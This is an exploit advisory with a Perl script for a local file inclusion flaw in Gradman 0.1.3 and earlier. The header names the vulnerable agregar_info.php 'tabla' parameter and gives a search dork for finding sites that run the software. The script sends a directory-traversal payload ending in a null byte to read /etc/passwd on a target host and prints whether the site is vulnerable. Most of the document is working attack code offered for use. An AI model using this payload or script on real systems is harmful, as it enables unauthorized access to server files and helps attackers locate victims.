[+] Info:

[~] Software: Gradman <= 0.1.3
[~] HomePage: http://gradman.xe1ido.com.mx/
[~] Exploit: Local File Inclusion [High]
[~] Where: agregar_info.php?tabla=
[~] Bug Found By: Jose Luis G?ngora Fern?ndez | JosS
[~] Contact: sys-project[at]hotmail.com
[~] Web: http://www.spanish-hackers.com
[~] Dork: "powered by Gradman"
[~] Dork2: Priv8, xD!


[+] Exploit:

use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;

print "\t\t########################################################\n\n";
print "\t\t#    Gradman <= 0.1.3 - Local File Inclusion Exploit   #\n\n";
print "\t\t#                        by JosS                       #\n\n";
print "\t\t########################################################\n\n";


if (!$ARGV[0])
{
print "Usage: perl xpl.pl [HOST]\n";
print "Example: perl xpl.pl http://localhost/gradman/\n";
}

else
{

$web=$ARGV[0];
chomp $web;

$iny="agregar_info.php?tabla=../../../../../../../../../../../../../../../../etc/passwd%00";

my $web1=$web.$iny;
print "$web1\n\n";
my $ua = LWP::UserAgent->new;
my $req=HTTP::Request->new(GET=>$web1);
$doc = $ua->request($req)->as_string;

if ($doc=~ /^root/moxis ){
print "Web is vuln\n";
}
else
{
print "Web is not vuln\n";
}

}

